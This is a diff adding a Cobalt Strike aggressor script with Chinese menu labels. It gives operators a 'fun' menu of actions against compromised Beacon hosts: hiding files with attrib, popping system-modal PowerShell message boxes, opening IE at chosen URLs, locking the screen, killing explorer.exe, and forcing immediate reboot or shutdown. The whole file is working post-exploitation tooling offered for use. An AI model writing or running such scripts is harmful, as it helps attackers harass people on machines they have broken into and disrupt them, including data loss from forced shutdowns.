@@ -1,0 +1,47 @@
+menu "☆ 试图娱乐"{
+    item "隐藏文件" {
+        blog($1, "\c9========== 隐藏文件 ==========");
+        prompt_text("文件路径", "", lambda({    bshell(@ids, "attrib +h +s $1"); }, @ids => $1));
+    }
+    item "显示文件" {
+        blog($1, "\c9========== 显示文件 ==========");
+        prompt_text("文件路径", "", lambda({    bshell(@ids, "attrib -h -s $1"); }, @ids => $1));
+    }    
+    item "聊天弹框" {
+        blog($1, "\c9========== 聊天弹框 ==========");
+        prompt_text("Alert", "你好！", lambda({
+            bpowershell(@ids, 'Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox("' . $1 . '", "OKOnly,MsgBoxSetForeground,SystemModal,Exclamation", "")' );
+            blog(@ids,"发送消息: $1 ");
+        }, @ids => $1));
+    }
+    item "IE 访问指定网站" {
+        blog($1, "\c9========== IE 访问指定网站 ==========");
+        prompt_text("输入网址", "https://www.baidu.com", lambda({
+            binput(@ids,"C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
+            bshell(@ids, "C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
+        }, @ids => $1));
+    }    
+    item "锁定屏幕" {
+        blog($1, "\c9========== 锁定屏幕 ==========");
+        prompt_text("确定锁屏?", "", lambda({
+        bshell(@ids, "rundll32.exe user32.dll,LockWorkStation");
+        }, @ids => $1));
+    }
+    item "隐藏桌面"{
+        blog($1, "\c9========== 隐藏桌面 ==========");
+        bshell($1,"taskkill /F /IM explorer.exe");
+    }
+    item "开启桌面"{
+        blog($1, "\c9========== 开启桌面 ==========");
+        brun($1, "explorer.exe");
+    }
+	item "重启" {
+        blog($1, "\c9========== 重启 ==========");
+        prompt_text("确定重启?", "", lambda({bshell(@ids, "shutdown -r -t 0");}, @ids => $1));
+    }	
+	item "关机" {
+        blog($1, "\c9========== 关机 ==========");
+        prompt_text("确定?", "", lambda({bshell(@ids, "shutdown -s -t 0");}, @ids => $1));
+    }
+}
+
